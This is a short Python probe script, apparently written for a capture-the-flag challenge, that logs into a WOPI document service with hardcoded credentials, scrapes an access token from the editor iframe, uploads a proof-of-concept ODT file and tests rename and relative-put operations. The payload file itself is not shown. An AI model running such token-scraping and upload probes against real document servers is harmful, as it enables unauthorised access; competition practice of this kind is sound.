#!/usr/bin/env python3
"""Temporary CTF WOPI upload and document-operation probe."""
import http.cookiejar
import html
import json
import pathlib
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
EMAIL = "arena-93aa1301@corp"
PASSWORD = "Arena-93aa1301-CTF!"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def req(path, method="GET", data=None, headers=None, form=None, limit=100000):
    url = urllib.parse.urljoin(BASE + "/", path)
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers = {**(headers or {}), "Content-Type": "application/x-www-form-urlencoded"}
    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    print("\n===", method, url, "DATA_BYTES", len(data or b""), "HEADERS", headers, flush=True)
    try:
        with opener.open(request, timeout=60) as r:
            raw = r.read(limit)
            text = raw.decode("utf-8", "replace")
            print("STATUS", r.status, "FINAL", r.url, "HEADERS", r.headers, flush=True)
            if len(raw) < 20000:
                print("BODY", text, flush=True)
            else:
                for line in text.splitlines():
                    if any(x in line for x in ("iframe", "doc-name", "error", "ctfcup", "BaseFileName")):
                        print("MATCH", line, flush=True)
            return r.status, r.url, raw, dict(r.headers)
    except urllib.error.HTTPError as e:
        raw = e.read(limit)
        print("HTTP_ERROR", e.code, e.headers, "BODY", raw.decode("utf-8", "replace"), flush=True)
        return e.code, e.url, raw, dict(e.headers)


req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
status, final, raw, _ = req("/docs/create", "POST", form={"folder": "", "title": "linked.odt"})
docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
print("DOCID", docid, flush=True)
status, _, editor, _ = req("/edit/" + docid)
match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
token = ""
if match:
    iframe = html.unescape(match.group(1).decode())
    token = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]
print("TOKEN", token, flush=True)
q = "?access_token=" + urllib.parse.quote(token)
req("/wopi/files/" + docid + q)
odt = pathlib.Path(__file__).with_name("poc.odt").read_bytes()
req("/wopi/files/" + docid + "/contents" + q, "POST", odt,
    {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"})
req("/wopi/files/" + docid + "/contents" + q)
for operation, extra in (
    ("RENAME_FILE", {"X-WOPI-RequestedName": "renamed.odt"}),
    ("PUT_RELATIVE", {"X-WOPI-RelativeTarget": "relative.odt"}),
):
    req("/wopi/files/" + docid + q, "POST", odt if operation == "PUT_RELATIVE" else None,
        {"X-WOPI-Override": operation, **extra})
    req("/wopi/files/" + docid + q)
req("/")
